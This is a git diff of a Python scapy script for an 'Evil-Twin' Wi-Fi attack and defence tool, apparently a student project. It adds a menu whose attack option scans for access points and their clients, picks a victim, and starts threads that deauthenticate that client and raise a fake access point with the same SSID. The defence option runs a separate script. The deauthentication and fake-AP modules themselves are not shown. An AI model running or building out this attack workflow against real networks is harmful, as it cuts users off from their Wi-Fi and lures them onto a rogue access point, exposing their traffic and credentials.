@@ -14,7 +14,7 @@ from threading import Thread
 
 
 
-
+tmp = []
 AvialableWifiNetworks = []
 Clients = []
 ChosenWifiMA = ""
@@ -29,13 +29,10 @@ def PacketHendler(packet):
         #type -menegment subtype-beacon
         if packet.type==0 and packet.subtype==8:
             #address 2 - transmitter.
-            exist = False
             # add the packet to AvialableWifiNetworks if not already in
-            for pkt in AvialableWifiNetworks:
-                if packet.addr2 == pkt.addr2:
-                    exist = True
-            if not exist:
+            if packet.addr2 not in tmp:
                 AvialableWifiNetworks.append(packet)
+                tmp.append(packet.addr2)
                 # print("Access Point Mac: %s with SSID:%s" %(packet.addr2 ,packet.info))
 
 
@@ -46,13 +43,12 @@ def WifiNetworksFinder():
     print("\nScanning for avialable wireless netwroks...\n")
     #  iface = the interfaces that we would like to sniff on
     # prn = allows us to pass a function that executes with each packet sniffed
-    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 10)
-
+    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 30)
 
     # printing the Available Wifi Networks withe their ssid(name) and their mac address
     print("\n\n\nThe Available Wifi Networks are:\n")
     for index, item in enumerate(AvialableWifiNetworks):
-        print(f"{index} - SSID : {item.info} , MAC Address : {item.addr2} ,")
+        print(f"{index} - SSID : {str(item.info)[2:len(str(item.info))-1]} , MAC Address : {item.addr2} ,")
     print("\n\n")
     while True:
         wifi_network_choice = input("Please select the Wifi network you want to use for the attack: ")
@@ -70,7 +66,7 @@ def WifiNetworksFinder():
 
 def ClientsFinder():
     print("\nScanning for clients...\n")
-    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 10)
+    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 40)
     print("\n\n\nThe Clients who connected to the chosen wifi are:\n")
     for index, item in enumerate(Clients):
         print(f"{index} MAC Address : {item} ,")
@@ -98,8 +94,8 @@ def CLientsSniffing(pkt):
         #         print(pkt.summary())
         #         if pkt.info not in Clients:
         #             Clients.append(pkt.info)
-        if pkt.addr3 == ChosenWifiMA and pkt.addr2 not in Clients and pkt.addr2 != ChosenWifiMA:
-            Clients.append(pkt.addr2)
+            if pkt.addr3 == ChosenWifiMA and pkt.addr2 not in Clients and pkt.addr2 != ChosenWifiMA:
+                Clients.append(pkt.addr2)
             # print(len(Clients),"     " ,pkt.addr2)
 
 
@@ -108,40 +104,49 @@ def CLientsSniffing(pkt):
 
 if __name__ == "__main__":
 
+    print("Hello there ! \n\nThis is a tool for 'Evil-Twin' Attack/Defence by Yair Liel and Rivka \n")
+    # case = 0
+    print("Menu:\n1:Attack\n2:Defence\n")
+    while True:
+        case = input("\nPlease choose which one of the tools you want to use: ")
+        if int(case) == 1:
+            #finding wifi adapter
+            WifiAdapter = WifiAdapterFinder()
+            #changing adapter to monitor mode
+            MonitorMode(WifiAdapter)
+            #scanning for wifi network to attack
+            wifi_details = WifiNetworksFinder()
+            ChosenWifiMA = wifi_details[0]
+            strr = str(wifi_details[1])
+            ChosenWifiSSID = strr[2:len(strr)-1]
+            #finding a specific client of the chosen wifi network to attack
+            ChosenClient=ClientsFinder()
+            APInterface = FindInterafaceForAP()
 
-    #finding wifi adapter
-    WifiAdapter = WifiAdapterFinder()
-    #changing adapter to monitor mode
-    MonitorMode(WifiAdapter)
-    #scanning for wifi network to attack
-    wifi_details = WifiNetworksFinder()
-    ChosenWifiMA = wifi_details[0]
-    ChosenWifiSSID = wifi_details[1]
-    #finding a specific client of the chosen wifi network to attack
-    ChosenClient=ClientsFinder()
-    APInterface = FindInterafaceForAP()
-
-
-
-    print("wifi adapter is : " , WifiAdapter)
-    print("AP interface is : " , APInterface)
-    print("chosen wifi mac address is : " , ChosenWifiMA)
-    print("chosen wifi ssid is : " , ChosenWifiSSID)
-    print("chosen client mac address is : " , ChosenClient)
-    #create thread that disconnect the victim from the chosen wifi 
-    Deauthenticate_thread = Thread(target=Deauthenticate.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
-
-
-    #create thread that create an fake wireless network (evil twin)
-    TwinNet_thread = Thread(target = create_ap.prepare_fake_access_point, args = [APInterface, ChosenWifiSSID])
-
-
-    Deauthenticate_thread.start()
-    TwinNet_thread.start()
+            print("wifi adapter is : " , WifiAdapter)
+            print("AP interface is : " , APInterface)
+            print("chosen wifi mac address is : " , ChosenWifiMA)
+            print("chosen wifi ssid is : " , ChosenWifiSSID)
+            print("chosen client mac address is : " , ChosenClient)
+            #create thread that disconnect the victim from the chosen wifi 
+            Deauthenticate_thread = Thread(target=Deauthenticate.deautenticate_user,args=[WifiAdapter,ChosenWifiMA,ChosenClient])
 
 
-    TwinNet_thread.join()
-    Deauthenticate_thread.join()
+            #create thread that create an fake wireless network (evil twin)
+            TwinNet_thread = Thread(target = create_ap.prepare_fake_access_point, args = [APInterface, ChosenWifiSSID])
+
+
+            Deauthenticate_thread.start()
+            TwinNet_thread.start()
+
+
+            TwinNet_thread.join()
+            Deauthenticate_thread.join()
+        elif int(case) == 2:
+            os.system("sudo python3 Defence.py")
+        else:
+            print("Please enter a number that corresponds with the choices available.")
+    
 
 
 
